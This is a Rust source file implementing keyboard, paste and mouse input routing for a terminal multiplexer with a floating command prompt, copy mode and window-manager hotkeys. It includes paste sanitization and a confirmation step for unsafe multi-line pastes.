use crossterm::event::{KeyCode, KeyEvent, KeyModifiers, MouseButton, MouseEvent, MouseEventKind};
use ratatui::layout::Rect;

use crate::error::Result;
use crate::pane::colon_command::{
    execute_colon_command, execute_wm_colon_command, parse_colon_command,
};
use crate::pane::{CompositePane, CopySelectionKind, PromptAnchor, PromptMouseDrag};
use crate::pty::line_discipline::InputRoutingMode;
use crate::vt::{encode_osc52_clipboard, is_unsafe_paste, sanitize_paste_bytes};
use crate::wm::split_tree::SplitDirection;
use crate::wm::{encode_sgr_mouse_local, WindowManager};

/// High-level application actions returned by the input router.
#[derive(Clone, Debug, PartialEq, Eq)]
pub enum AppAction {
    /// Continue running the event loop.
    Continue,
    /// User requested clean application exit (`Ctrl+Q` or `:quit`).
    Quit,
    /// Bytes were dispatched to the active pane's PTY (or floating prompt state mutated).
    Handled,
}

/// Routes a `crossterm::event::KeyEvent` for the active `CompositePane` (`PTY-02..04`, `PANE-01..05`).
pub fn handle_key_event(pane: &mut CompositePane, key: KeyEvent) -> Result<AppAction> {
    pane.refresh_line_discipline();

    // Global emergency quit: Ctrl+Q
    if key.modifiers.contains(KeyModifiers::CONTROL) && key.code == KeyCode::Char('q') {
        return Ok(AppAction::Quit);
    }

    // If an unsafe raw PTY paste is awaiting user confirmation (FND-01), route keys to the modal first
    if pane.pending_unsafe_paste.is_some() {
        return handle_unsafe_paste_modal_key(pane, key);
    }

    // If keyboard-driven Vi Copy Mode is active on the OutputCanvas (VAL-04), route keys to it first
    if pane.copy_mode.active {
        return handle_copy_mode_key(pane, key);
    }

    // If fuzzy history search is active, route keys to fuzzy search modal first
    if pane.is_prompt_visible() && pane.prompt.fuzzy_search.active {
        return handle_fuzzy_search_key(pane, key);
    }

    // If the Borland Command History Pop-up Window is open, route keys to it first
    if pane.is_prompt_visible() && pane.prompt.history_popup_open {
        return handle_history_popup_key(pane, key);
    }

    // Global manual toggle between CommandPrompt and RawPtyPassthrough: Ctrl+G or F12
    if (key.modifiers.contains(KeyModifiers::CONTROL) && key.code == KeyCode::Char('g'))
        || key.code == KeyCode::F(12)
    {
        pane.toggle_manual_raw_override();
        return Ok(AppAction::Handled);
    }

    // Intra-pane prompt positioning, height resize, search, copy mode, and OSC 133 command-block jump hotkeys
    if key.modifiers.contains(KeyModifiers::ALT) {
        match key.code {
            KeyCode::Char('t') => {
                pane.set_prompt_anchor(PromptAnchor::Top);
                return Ok(AppAction::Handled);
            }
            KeyCode::Char('b') => {
                pane.set_prompt_anchor(PromptAnchor::Bottom);
                return Ok(AppAction::Handled);
            }
            KeyCode::Char('s') => {
                pane.toggle_split_prompt();
                return Ok(AppAction::Handled);
            }
            KeyCode::Char('c') => {
                if pane.copy_mode.active {
                    pane.exit_copy_mode();
                } else {
                    pane.enter_copy_mode();
                }
                return Ok(AppAction::Handled);
            }
            KeyCode::Char('/') => {
                if pane.is_prompt_visible() {
                    pane.prompt.set_text(":search ");
                }
                return Ok(AppAction::Handled);
            }
            KeyCode::Char('n') => {
                pane.next_canvas_search_match();
                return Ok(AppAction::Handled);
            }
            KeyCode::Char('N') => {
                pane.prev_canvas_search_match();
                return Ok(AppAction::Handled);
            }
            KeyCode::Up => {
                let h = pane.vt.size().0 + 1;
                pane.move_prompt_vertical(-1, h);
                return Ok(AppAction::Handled);
            }
            KeyCode::Down => {
                let h = pane.vt.size().0 + 1;
                pane.move_prompt_vertical(1, h);
                return Ok(AppAction::Handled);
            }
            KeyCode::Char('+') | KeyCode::Char('=') => {
                pane.resize_prompt_height(1);
                return Ok(AppAction::Handled);
            }
            KeyCode::Char('-') => {
                pane.resize_prompt_height(-1);
                return Ok(AppAction::Handled);
            }
            KeyCode::Char(']') => {
                pane.resize_prompt_width(4);
                return Ok(AppAction::Handled);
            }
            KeyCode::Char('[') => {
                pane.resize_prompt_width(-4);
                return Ok(AppAction::Handled);
            }
            KeyCode::Char('p') => {
                pane.prompt.toggle_history_popup();
                return Ok(AppAction::Handled);
            }
            KeyCode::PageUp => {
                pane.vt.jump_to_prev_command_block();
                return Ok(AppAction::Handled);
            }
            KeyCode::PageDown => {
                pane.vt.jump_to_next_command_block();
                return Ok(AppAction::Handled);
            }
            KeyCode::Left => {
                if pane.effective_routing_mode() == InputRoutingMode::CommandPrompt {
                    pane.prompt.move_word_left();
                    return Ok(AppAction::Handled);
                }
            }
            KeyCode::Right => {
                if pane.effective_routing_mode() == InputRoutingMode::CommandPrompt {
                    pane.prompt.move_word_right();
                    return Ok(AppAction::Handled);
                }
            }
            KeyCode::Enter => {
                if pane.effective_routing_mode() == InputRoutingMode::CommandPrompt {
                    pane.prompt.insert_newline();
                    return Ok(AppAction::Handled);
                }
            }
            _ => {}
        }
    }

    match pane.effective_routing_mode() {
        InputRoutingMode::CommandPrompt => handle_command_prompt_key(pane, key),
        InputRoutingMode::RawPtyPassthrough => {
            let bytes = encode_key_to_pty_bytes_full(
                key,
                pane.vt.is_application_cursor(),
                pane.vt.is_backarrow_key_67(),
                pane.vt.kitty_keyboard_flags(),
            );
            if !bytes.is_empty()
                && let Some(pty) = &pane.pty
            {
                pty.write_all(&bytes)?;
            }
            Ok(AppAction::Handled)
        }
    }
}

fn handle_unsafe_paste_modal_key(pane: &mut CompositePane, key: KeyEvent) -> Result<AppAction> {
    match key.code {
        KeyCode::Char('y') | KeyCode::Char('Y') | KeyCode::Enter => {
            if let Some(payload) = pane.pending_unsafe_paste.take() {
                let clean = sanitize_paste_bytes(&payload).replace("\x1b[201~", "");
                if let Some(pty) = &pane.pty {
                    if pane.vt.is_bracketed_paste() {
                        let mut framed = Vec::with_capacity(clean.len() + 12);
                        framed.extend_from_slice(b"\x1b[200~");
                        framed.extend_from_slice(clean.as_bytes());
                        framed.extend_from_slice(b"\x1b[201~");
                        pty.write_all(&framed)?;
                    } else {
                        pty.write_all(clean.as_bytes())?;
                    }
                }
                pane.status_message = Some(format!("Confirmed paste ({} chars)", clean.len()));
            }
            Ok(AppAction::Handled)
        }
        KeyCode::Char('n') | KeyCode::Char('N') | KeyCode::Esc => {
            pane.pending_unsafe_paste = None;
            pane.status_message = Some("Cancelled unsafe multi-line paste".to_string());
            Ok(AppAction::Handled)
        }
        _ => Ok(AppAction::Handled),
    }
}

fn handle_copy_mode_key(pane: &mut CompositePane, key: KeyEvent) -> Result<AppAction> {
    let (rows, cols) = pane.vt.size();
    let max_r = rows.saturating_sub(1);
    let max_c = cols.saturating_sub(1);

    if key.modifiers.contains(KeyModifiers::CONTROL) && key.code == KeyCode::Char('v') {
        pane.copy_mode.anchor = Some((pane.copy_mode.cursor_row, pane.copy_mode.cursor_col));
        pane.copy_mode.selection_kind = CopySelectionKind::Block;
        pane.status_message = Some("COPY MODE: VISUAL BLOCK (rectangular)".to_string());
        return Ok(AppAction::Handled);
    }

    match key.code {
        KeyCode::Esc | KeyCode::Char('q') => {
            pane.exit_copy_mode();
        }
        KeyCode::Left | KeyCode::Char('h') => {
            pane.copy_mode.cursor_col = pane.copy_mode.cursor_col.saturating_sub(1);
        }
        KeyCode::Right | KeyCode::Char('l') => {
            pane.copy_mode.cursor_col = (pane.copy_mode.cursor_col + 1).min(max_c);
        }
        KeyCode::Up | KeyCode::Char('k') => {
            if pane.copy_mode.cursor_row > 0 {
                pane.copy_mode.cursor_row -= 1;
            } else {
                pane.vt.scroll_up(1);
            }
        }
        KeyCode::Down | KeyCode::Char('j') => {
            if pane.copy_mode.cursor_row < max_r {
                pane.copy_mode.cursor_row += 1;
            } else {
                pane.vt.scroll_down(1);
            }
        }
        KeyCode::Home | KeyCode::Char('0') => {
            pane.copy_mode.cursor_col = 0;
        }
        KeyCode::End | KeyCode::Char('$') => {
            pane.copy_mode.cursor_col = max_c;
        }
        KeyCode::Char('w') => {
            pane.copy_mode.cursor_col = (pane.copy_mode.cursor_col + 5).min(max_c);
        }
        KeyCode::Char('b') => {
            // 'b' toggles Rectangular Block selection when no modifier or moves word back if already in char mode
            if pane.copy_mode.selection_kind != CopySelectionKind::Block {
                pane.copy_mode.anchor =
                    Some((pane.copy_mode.cursor_row, pane.copy_mode.cursor_col));
                pane.copy_mode.selection_kind = CopySelectionKind::Block;
                pane.status_message = Some("COPY MODE: VISUAL BLOCK (rectangular)".to_string());
            } else {
                pane.copy_mode.cursor_col = pane.copy_mode.cursor_col.saturating_sub(5);
            }
        }
        KeyCode::Char('v') => {
            pane.copy_mode.anchor = Some((pane.copy_mode.cursor_row, pane.copy_mode.cursor_col));
            pane.copy_mode.selection_kind = CopySelectionKind::Char;
            pane.status_message = Some("COPY MODE: VISUAL CHAR".to_string());
        }
        KeyCode::Char('V') => {
            pane.copy_mode.anchor = Some((pane.copy_mode.cursor_row, pane.copy_mode.cursor_col));
            pane.copy_mode.selection_kind = CopySelectionKind::Line;
            pane.status_message = Some("COPY MODE: VISUAL LINE".to_string());
        }
        KeyCode::Char('y') | KeyCode::Enter => {
            pane.yank_copy_selection();
        }
        _ => {}
    }
    Ok(AppAction::Handled)
}

fn handle_fuzzy_search_key(pane: &mut CompositePane, key: KeyEvent) -> Result<AppAction> {
    if key.modifiers.contains(KeyModifiers::CONTROL) {
        match key.code {
            KeyCode::Char('g') | KeyCode::Char('c') => {
                pane.prompt.cancel_fuzzy_search();
                return Ok(AppAction::Handled);
            }
            KeyCode::Char('r') | KeyCode::Char('n') => {
                pane.prompt.fuzzy_search.select_next();
                return Ok(AppAction::Handled);
            }
            KeyCode::Char('p') => {
                pane.prompt.fuzzy_search.select_prev();
                return Ok(AppAction::Handled);
            }
            _ => {}
        }
    }

    match key.code {
        KeyCode::Esc => {
            pane.prompt.cancel_fuzzy_search();
            Ok(AppAction::Handled)
        }
        KeyCode::Enter => {
            pane.prompt.accept_fuzzy_match();
            Ok(AppAction::Handled)
        }
        KeyCode::Up => {
            pane.prompt.fuzzy_search.select_prev();
            Ok(AppAction::Handled)
        }
        KeyCode::Down => {
            pane.prompt.fuzzy_search.select_next();
            Ok(AppAction::Handled)
        }
        KeyCode::Backspace => {
            pane.prompt.pop_fuzzy_query_char();
            Ok(AppAction::Handled)
        }
        KeyCode::Char(ch) => {
            pane.prompt.push_fuzzy_query_char(ch);
            Ok(AppAction::Handled)
        }
        _ => Ok(AppAction::Handled),
    }
}

fn handle_history_popup_key(pane: &mut CompositePane, key: KeyEvent) -> Result<AppAction> {
    match key.code {
        KeyCode::Esc | KeyCode::Char('q') => {
            pane.prompt.history_popup_open = false;
            Ok(AppAction::Handled)
        }
        KeyCode::Enter => {
            pane.prompt.accept_history_popup_selection();
            Ok(AppAction::Handled)
        }
        KeyCode::Up | KeyCode::Char('k') => {
            pane.prompt.history_popup_prev();
            Ok(AppAction::Handled)
        }
        KeyCode::Down | KeyCode::Char('j') => {
            pane.prompt.history_popup_next();
            Ok(AppAction::Handled)
        }
        KeyCode::Char('s') => {
            if let Ok(saved) = pane
                .history_store
                .export_to_temp_file(&pane.prompt.history, None)
            {
                pane.status_message = Some(format!("Saved history to {}", saved.display()));
            }
            Ok(AppAction::Handled)
        }
        _ => Ok(AppAction::Handled),
    }
}

fn handle_command_prompt_key(pane: &mut CompositePane, key: KeyEvent) -> Result<AppAction> {
    if key.modifiers.contains(KeyModifiers::SHIFT) {
        match key.code {
            KeyCode::Enter => {
                pane.prompt.insert_newline();
                return Ok(AppAction::Handled);
            }
            KeyCode::PageUp => {
                pane.prompt.scroll_up(2);
                return Ok(AppAction::Handled);
            }
            KeyCode::PageDown => {
                pane.prompt.scroll_down(2);
                return Ok(AppAction::Handled);
            }
            _ => {}
        }
    }

    if key.modifiers.contains(KeyModifiers::CONTROL) {
        match key.code {
            KeyCode::Char('r') => {
                pane.prompt.open_fuzzy_search();
                return Ok(AppAction::Handled);
            }
            KeyCode::Char('c') => {
                // If a foreground subcommand (e.g. `tail -f /dev/random`) is running or the prompt is empty,
                // forward SIGINT (0x03) to the PTY; also clear any partial prompt text and running banner.
                let has_fg_sub = pane.line_discipline.has_foreground_subcommand();
                let prompt_was_empty = pane.prompt.input.is_empty();
                pane.prompt.running_command = None;
                if !prompt_was_empty {
                    pane.prompt.clear_line();
                }
                if prompt_was_empty || has_fg_sub {
                    if let Some(pty) = &pane.pty {
                        pty.write_all(&[0x03])?;
                    }
                }
                return Ok(AppAction::Handled);
            }
            KeyCode::Char('u') => {
                pane.prompt.clear_line();
                return Ok(AppAction::Handled);
            }
            KeyCode::Char('k') => {
                pane.prompt.kill_to_end_of_line();
                return Ok(AppAction::Handled);
            }
            KeyCode::Char('w') => {
                pane.prompt.kill_prev_word();
                return Ok(AppAction::Handled);
            }
            KeyCode::Char('y') => {
                pane.prompt.yank();
                return Ok(AppAction::Handled);
            }
            KeyCode::Char('z') => {
                pane.prompt.undo();
                return Ok(AppAction::Handled);
            }
            KeyCode::Char('a') => {
                pane.prompt.move_cursor_home();
                return Ok(AppAction::Handled);
            }
            KeyCode::Char('e') => {
                pane.prompt.move_cursor_end();
                return Ok(AppAction::Handled);
            }
            KeyCode::Char('d') => {
                if pane.prompt.input.is_empty() {
                    if let Some(pty) = &pane.pty {
                        pty.write_all(&[0x04])?;
                    }
                } else {
                    pane.prompt.delete_char();
                }
                return Ok(AppAction::Handled);
            }
            _ => {}
        }
    }

    match key.code {
        KeyCode::Enter => {
            let submitted = pane.prompt.take_submission();
            // Check for in-prompt :command execution first (PANE-03, PANE-05)
            if let Some(cmd_res) = parse_colon_command(&submitted) {
                match cmd_res {
                    Ok(cmd) => {
                        if execute_colon_command(pane, cmd) {
                            return Ok(AppAction::Quit);
                        }
                    }
                    Err(err_msg) => {
                        pane.status_message = Some(err_msg);
                    }
                }
                return Ok(AppAction::Handled);
            }

            pane.vt.reset_scrollback();
            pane.vt.record_command_submission(submitted.clone());
            let _ = pane.history_store.record_command(&submitted);
            if let Some(pty) = &pane.pty {
                let mut payload = submitted.into_bytes();
                payload.push(b'\n');
                pty.write_all(&payload)?;
            }
            Ok(AppAction::Handled)
        }
        KeyCode::Tab => {
            pane.complete_prompt_tab(key.modifiers.contains(KeyModifiers::SHIFT));
            Ok(AppAction::Handled)
        }
        KeyCode::BackTab => {
            pane.complete_prompt_tab(true);
            Ok(AppAction::Handled)
        }
        KeyCode::Esc => {
            pane.prompt.completion.clear();
            Ok(AppAction::Handled)
        }
        KeyCode::Backspace => {
            pane.prompt.backspace();
            Ok(AppAction::Handled)
        }
        KeyCode::Delete => {
            pane.prompt.delete_char();
            Ok(AppAction::Handled)
        }
        KeyCode::Left => {
            pane.prompt.move_cursor_left();
            Ok(AppAction::Handled)
        }
        KeyCode::Right => {
            pane.prompt.move_cursor_right();
            Ok(AppAction::Handled)
        }
        KeyCode::Home => {
            pane.prompt.move_cursor_home();
            Ok(AppAction::Handled)
        }
        KeyCode::End => {
            pane.prompt.move_cursor_end();
            Ok(AppAction::Handled)
        }
        KeyCode::Up => {
            if !pane.prompt.move_cursor_up() {
                pane.prompt.history_prev();
            }
            Ok(AppAction::Handled)
        }
        KeyCode::Down => {
            if !pane.prompt.move_cursor_down() {
                pane.prompt.history_next();
            }
            Ok(AppAction::Handled)
        }
        KeyCode::PageUp => {
            pane.vt.scroll_up(5);
            Ok(AppAction::Handled)
        }
        KeyCode::PageDown => {
            pane.vt.scroll_down(5);
            Ok(AppAction::Handled)
        }
        KeyCode::Char(ch) => {
            pane.prompt.insert_char(ch);
            Ok(AppAction::Handled)
        }
        _ => Ok(AppAction::Continue),
    }
}

/// Routes a `crossterm::event::Event::Paste` payload (`PTY-04`, `DECSET 2004`, `FND-01`).
///
/// - Always sanitizes dangerous C0/DEL control bytes via `sanitize_paste_bytes` (`FND-01`).
/// - In `CommandPrompt` mode: inserts sanitized text directly into `FloatingPromptState` without
///   auto-executing newlines so the user can inspect/edit pasted scripts before pressing `Enter`.
/// - In `RawPtyPassthrough` mode: checks `is_unsafe_paste` (unbracketed multi-line paste or embedded
///   `\x1b[201~` breakout) and stages `pending_unsafe_paste` for user confirmation when unsafe;
///   otherwise wraps in `\x1b[200~...\x1b[201~` if `DECSET 2004` is active or writes raw bytes.
pub fn handle_paste_event(pane: &mut CompositePane, pasted_text: &str) -> Result<AppAction> {
    pane.refresh_line_discipline();
    let sanitized = sanitize_paste_bytes(pasted_text);
    match pane.effective_routing_mode() {
        InputRoutingMode::CommandPrompt => {
            pane.prompt.insert_str(&sanitized);
            Ok(AppAction::Handled)
        }
        InputRoutingMode::RawPtyPassthrough => {
            let bracketed = pane.vt.is_bracketed_paste();
            if is_unsafe_paste(pasted_text, bracketed) {
                pane.pending_unsafe_paste = Some(pasted_text.to_string());
                pane.status_message = Some(
                    "UNSAFE MULTI-LINE PASTE DETECTED: Press [y/Enter] to confirm or [n/Esc] to cancel"
                        .to_string(),
                );
                return Ok(AppAction::Handled);
            }
            if let Some(pty) = &pane.pty {
                if bracketed {
                    let mut framed = Vec::with_capacity(sanitized.len() + 12);
                    framed.extend_from_slice(b"\x1b[200~");
                    framed.extend_from_slice(sanitized.as_bytes());
                    framed.extend_from_slice(b"\x1b[201~");
                    pty.write_all(&framed)?;
                } else {
                    pty.write_all(sanitized.as_bytes())?;
                }
            }
            Ok(AppAction::Handled)
        }
    }
}

/// Computes `DECSET ?1007` Mouse Alternate Scroll arrow-key bytes when scrolling inside an
/// Alternate Screen (`?1049`) program that has not enabled mouse tracking (`less`, `man`, `git log`, `FND-02`).
pub fn encode_alternate_scroll_wheel(pane: &CompositePane, kind: MouseEventKind) -> Option<Vec<u8>> {
    if !pane.vt.is_alternate_screen()
        || pane.vt.is_mouse_sgr_or_tracking()
        || !pane.vt.is_mouse_alternate_scroll()
    {
        return None;
    }
    let unit: &[u8] = match kind {
        MouseEventKind::ScrollUp => {
            if pane.vt.is_application_cursor() {
                b"\x1bOA"
            } else {
                b"\x1b[A"
            }
        }
        MouseEventKind::ScrollDown => {
            if pane.vt.is_application_cursor() {
                b"\x1bOB"
            } else {
                b"\x1b[B"
            }
        }
        _ => return None,
    };
    let mut out = Vec::with_capacity(unit.len() * 3);
    for _ in 0..3 {
        out.extend_from_slice(unit);
    }
    Some(out)
}

/// Routes SGR mouse events for intra-pane floating prompt dragging, height resizing,
/// `[▲][▼]` pin badge clicks, `Ctrl+Click` URL yanking (`VAL-03`), `Alt+LeftDrag` rectangular canvas selection (`VAL-04`),
/// `DECSET ?1007` alternate scroll (`FND-02`), and canvas scrollback (`PANE-02`, `PANE-03`).
pub fn handle_mouse_event(
    pane: &mut CompositePane,
    mouse: MouseEvent,
    viewport: Rect,
) -> Result<AppAction> {
    if !pane.is_prompt_visible() {
        if let Some(scroll_bytes) = encode_alternate_scroll_wheel(pane, mouse.kind) {
            if let Some(pty) = &pane.pty {
                pty.write_all(&scroll_bytes)?;
            }
            return Ok(AppAction::Handled);
        }
        return Ok(AppAction::Continue);
    }

    let prompt_rect = pane.prompt_rect(viewport);
    let canvas_rect = pane.canvas_rect(viewport);
    let col = mouse.column;
    let row = mouse.row;
    let in_prompt = col >= prompt_rect.x
        && col < prompt_rect.x + prompt_rect.width
        && row >= prompt_rect.y
        && row < prompt_rect.y + prompt_rect.height;
    let in_canvas = col >= canvas_rect.x
        && col < canvas_rect.x + canvas_rect.width
        && row >= canvas_rect.y
        && row < canvas_rect.y + canvas_rect.height;

    match mouse.kind {
        MouseEventKind::Down(MouseButton::Left) => {
            // Ctrl+LeftClick on OutputCanvas: check for URL at clicked cell and yank via OSC 52 (VAL-03)
            if mouse.modifiers.contains(KeyModifiers::CONTROL) && in_canvas && !in_prompt {
                let rel_r = row.saturating_sub(canvas_rect.y);
                let rel_c = col.saturating_sub(canvas_rect.x);
                if let Some(url) = pane.vt.url_at(rel_r, rel_c) {
                    let seq = encode_osc52_clipboard(&url);
                    pane.last_osc52_sequence = Some(seq);
                    pane.prompt.yank_buffer = url.clone();
                    pane.status_message = Some(format!("Yanked URL: {url}"));
                    return Ok(AppAction::Handled);
                }
            }

            // Alt+LeftClick on OutputCanvas: start rectangular block selection (VAL-04)
            if mouse.modifiers.contains(KeyModifiers::ALT) && in_canvas && !in_prompt {
                let rel_r = row.saturating_sub(canvas_rect.y);
                let rel_c = col.saturating_sub(canvas_rect.x);
                pane.copy_mode.active = true;
                pane.copy_mode.anchor = Some((rel_r, rel_c));
                pane.copy_mode.cursor_row = rel_r;
                pane.copy_mode.cursor_col = rel_c;
                pane.copy_mode.selection_kind = CopySelectionKind::Block;
                pane.mouse_drag = Some(PromptMouseDrag::CanvasRectSelect);
                return Ok(AppAction::Handled);
            }

            // Top border of floating prompt: check [▲][▼] pin badges on right side or start vertical move drag
            if row == prompt_rect.y
                && col >= prompt_rect.x
                && col < prompt_rect.x + prompt_rect.width
            {
                let right_edge = prompt_rect.x + prompt_rect.width;
                // Layout on top-right border: ... [▲][▼]─┐ (right_edge - 8..right_edge - 5 is [▲], right_edge - 5..right_edge - 2 is [▼])
                if prompt_rect.width >= 16 {
                    let top_btn_start = right_edge.saturating_sub(8);
                    let bot_btn_start = right_edge.saturating_sub(5);
                    if col >= top_btn_start && col < top_btn_start + 3 {
                        pane.set_prompt_anchor(PromptAnchor::Top);
                        return Ok(AppAction::Handled);
                    }
                    if col >= bot_btn_start && col < bot_btn_start + 3 {
                        pane.set_prompt_anchor(PromptAnchor::Bottom);
                        return Ok(AppAction::Handled);
                    }
                }
                pane.mouse_drag = Some(PromptMouseDrag::MovePrompt {
                    grab_x_offset: col.saturating_sub(prompt_rect.x),
                });
                return Ok(AppAction::Handled);
            }

            // Bottom border of floating prompt: check bottom-right corner (`◢`) or start height resize drag
            let bottom_y = prompt_rect.y + prompt_rect.height.saturating_sub(1);
            let right_x = prompt_rect.x + prompt_rect.width.saturating_sub(1);
            if row == bottom_y && col == right_x {
                pane.mouse_drag = Some(PromptMouseDrag::ResizePromptCorner);
                return Ok(AppAction::Handled);
            }
            if row == bottom_y && col >= prompt_rect.x && col < prompt_rect.x + prompt_rect.width {
                pane.mouse_drag = Some(PromptMouseDrag::ResizePrompt);
                return Ok(AppAction::Handled);
            }

            // Left border of floating prompt: start left width resize drag
            if col == prompt_rect.x && row > prompt_rect.y && row < bottom_y {
                pane.mouse_drag = Some(PromptMouseDrag::ResizePromptLeft);
                return Ok(AppAction::Handled);
            }

            // Right border of floating prompt: start right width resize drag
            if col == right_x && row > prompt_rect.y && row < bottom_y {
                pane.mouse_drag = Some(PromptMouseDrag::ResizePromptRight);
                return Ok(AppAction::Handled);
            }
        }
        MouseEventKind::Drag(MouseButton::Left) => {
            if let Some(drag) = pane.mouse_drag {
                match drag {
                    PromptMouseDrag::MovePrompt { grab_x_offset } => {
                        let rel_y = row.saturating_sub(canvas_rect.y);
                        if rel_y == 0 {
                            pane.set_prompt_anchor(PromptAnchor::Top);
                        } else if rel_y + prompt_rect.height >= canvas_rect.height {
                            pane.set_prompt_anchor(PromptAnchor::Bottom);
                        } else {
                            pane.set_prompt_anchor(PromptAnchor::Floating { y_offset: rel_y });
                        }
                        if pane.prompt.width_cols.is_some() {
                            let target_x = col.saturating_sub(grab_x_offset).saturating_sub(canvas_rect.x);
                            let max_x = canvas_rect.width.saturating_sub(prompt_rect.width);
                            pane.prompt.x_offset = Some(target_x.min(max_x));
                        }
                        return Ok(AppAction::Handled);
                    }
                    PromptMouseDrag::ResizePrompt => {
                        let new_height = row.saturating_sub(prompt_rect.y).saturating_add(1);
                        pane.set_prompt_height(new_height.clamp(3, 12));
                        return Ok(AppAction::Handled);
                    }
                    PromptMouseDrag::ResizePromptRight => {
                        let new_width = col.saturating_sub(prompt_rect.x).saturating_add(1);
                        pane.set_prompt_width(Some(new_width.clamp(16, canvas_rect.width.max(16))));
                        return Ok(AppAction::Handled);
                    }
                    PromptMouseDrag::ResizePromptLeft => {
                        let right_edge = prompt_rect.x + prompt_rect.width;
                        let clamped_col = col.clamp(canvas_rect.x, right_edge.saturating_sub(16));
                        let new_width = right_edge.saturating_sub(clamped_col).max(16);
                        pane.prompt.x_offset = Some(clamped_col.saturating_sub(canvas_rect.x));
                        pane.set_prompt_width(Some(new_width));
                        return Ok(AppAction::Handled);
                    }
                    PromptMouseDrag::ResizePromptCorner => {
                        let new_height = row.saturating_sub(prompt_rect.y).saturating_add(1);
                        let new_width = col.saturating_sub(prompt_rect.x).saturating_add(1);
                        pane.set_prompt_height(new_height.clamp(3, 12));
                        pane.set_prompt_width(Some(new_width.clamp(16, canvas_rect.width.max(16))));
                        return Ok(AppAction::Handled);
                    }
                    PromptMouseDrag::CanvasRectSelect => {
                        let rel_r = row
                            .saturating_sub(canvas_rect.y)
                            .min(canvas_rect.height.saturating_sub(1));
                        let rel_c = col
                            .saturating_sub(canvas_rect.x)
                            .min(canvas_rect.width.saturating_sub(1));
                        pane.copy_mode.cursor_row = rel_r;
                        pane.copy_mode.cursor_col = rel_c;
                        return Ok(AppAction::Handled);
                    }
                }
            }
        }
        MouseEventKind::Up(MouseButton::Left) => {
            if let Some(drag) = pane.mouse_drag.take() {
                if drag == PromptMouseDrag::CanvasRectSelect {
                    let _ = pane.yank_copy_selection();
                }
                return Ok(AppAction::Handled);
            }
        }
        MouseEventKind::ScrollUp => {
            if in_prompt && pane.prompt.lines.len() > 1 {
                pane.prompt.scroll_up(1);
            } else {
                pane.vt.scroll_up(3);
            }
            return Ok(AppAction::Handled);
        }
        MouseEventKind::ScrollDown => {
            if in_prompt && pane.prompt.lines.len() > 1 {
                pane.prompt.scroll_down(1);
            } else {
                pane.vt.scroll_down(3);
            }
            return Ok(AppAction::Handled);
        }
        _ => {}
    }

    Ok(AppAction::Continue)
}

/// Routes a `KeyEvent` across the multi-pane `WindowManager` (`WM-01..05`).
pub fn handle_wm_key_event(wm: &mut WindowManager, key: KeyEvent) -> Result<AppAction> {
    // Global emergency quit: Ctrl+Q
    if key.modifiers.contains(KeyModifiers::CONTROL) && key.code == KeyCode::Char('q') {
        return Ok(AppAction::Quit);
    }

    // If the <F1> Help modal is open, route keys to it first
    if wm.help_visible {
        match key.code {
            KeyCode::F(1) | KeyCode::Esc | KeyCode::Char('q') => {
                wm.help_visible = false;
            }
            KeyCode::Up | KeyCode::Char('k') => {
                wm.help_scroll = wm.help_scroll.saturating_sub(1);
            }
            KeyCode::Down | KeyCode::Char('j') => {
                wm.help_scroll = wm.help_scroll.saturating_add(1);
            }
            KeyCode::PageUp => {
                wm.help_scroll = wm.help_scroll.saturating_sub(8);
            }
            KeyCode::PageDown => {
                wm.help_scroll = wm.help_scroll.saturating_add(8);
            }
            _ => {}
        }
        return Ok(AppAction::Handled);
    }

    // Global Guake/Quake-style quick terminal drop-down hotkey: Alt+` or Ctrl+Space (WM-05)
    if (key.modifiers.contains(KeyModifiers::ALT) && key.code == KeyCode::Char('`'))
        || (key.modifiers.contains(KeyModifiers::CONTROL) && key.code == KeyCode::Char(' '))
    {
        wm.toggle_quick_terminal();
        return Ok(AppAction::Handled);
    }

    // Borland Turbo Vision function keys: F1 = Help, F2 = Split, F5 = Zoom, F6 = Next Pane, F10 = Quake
    match key.code {
        KeyCode::F(1) => {
            wm.toggle_help();
            return Ok(AppAction::Handled);
        }
        KeyCode::F(2) => {
            wm.split_focused(SplitDirection::Horizontal)?;
            return Ok(AppAction::Handled);
        }
        KeyCode::F(5) => {
            wm.toggle_zoom();
            return Ok(AppAction::Handled);
        }
        KeyCode::F(6) => {
            wm.shuffle_deck_next();
            return Ok(AppAction::Handled);
        }
        KeyCode::F(10) => {
            wm.toggle_quick_terminal();
            return Ok(AppAction::Handled);
        }
        _ => {}
    }

    // Multi-pane Window Manager Alt-chords
    if key.modifiers.contains(KeyModifiers::ALT) {
        match key.code {
            KeyCode::Char('x') => {
                if !wm.config.crosshair_cursor {
                    wm.config.crosshair_cursor = true;
                    wm.config.crosshair_fullscreen = false;
                } else if !wm.config.crosshair_fullscreen {
                    wm.config.crosshair_fullscreen = true;
                } else {
                    wm.config.crosshair_cursor = false;
                    wm.config.crosshair_fullscreen = false;
                }
                return Ok(AppAction::Handled);
            }
            KeyCode::Char('h') => {
                wm.split_focused(SplitDirection::Horizontal)?;
                return Ok(AppAction::Handled);
            }
            KeyCode::Char('v') => {
                wm.split_focused(SplitDirection::Vertical)?;
                return Ok(AppAction::Handled);
            }
            KeyCode::Char('w') => {
                wm.close_focused_pane();
                return Ok(AppAction::Handled);
            }
            KeyCode::Char('z') => {
                wm.toggle_zoom();
                return Ok(AppAction::Handled);
            }
            KeyCode::Char('m') => {
                wm.toggle_layout_mode();
                return Ok(AppAction::Handled);
            }
            KeyCode::Tab => {
                wm.shuffle_deck_next();
                return Ok(AppAction::Handled);
            }
            KeyCode::BackTab => {
                wm.shuffle_deck_prev();
                return Ok(AppAction::Handled);
            }
            KeyCode::Char(d @ '1'..='9') => {
                let id = (d as u8 - b'0') as usize;
                wm.focus_and_raise(id);
                return Ok(AppAction::Handled);
            }
            _ => {}
        }
    }

    // Intercept Enter on `:split`, `:deck`, `:focus`, `:zoom`, `:close`, `:layout`, `:quake`
    if key.code == KeyCode::Enter
        && !key.modifiers.contains(KeyModifiers::SHIFT)
        && !key.modifiers.contains(KeyModifiers::ALT)
        && wm.active_pane().effective_routing_mode() == InputRoutingMode::CommandPrompt
        && !wm.active_pane().prompt.fuzzy_search.active
        && !wm.active_pane().copy_mode.active
        && wm.active_pane().pending_unsafe_paste.is_none()
    {
        let text = wm.active_pane().prompt.text();
        if let Some(cmd_res) = parse_colon_command(&text) {
            let _ = wm.active_pane_mut().prompt.take_submission();
            match cmd_res {
                Ok(cmd) => {
                    if execute_wm_colon_command(wm, cmd) {
                        return Ok(AppAction::Quit);
                    }
                }
                Err(err) => {
                    wm.active_pane_mut().status_message = Some(err);
                }
            }
            return Ok(AppAction::Handled);
        }
    }

    handle_key_event(wm.active_pane_mut(), key)
}

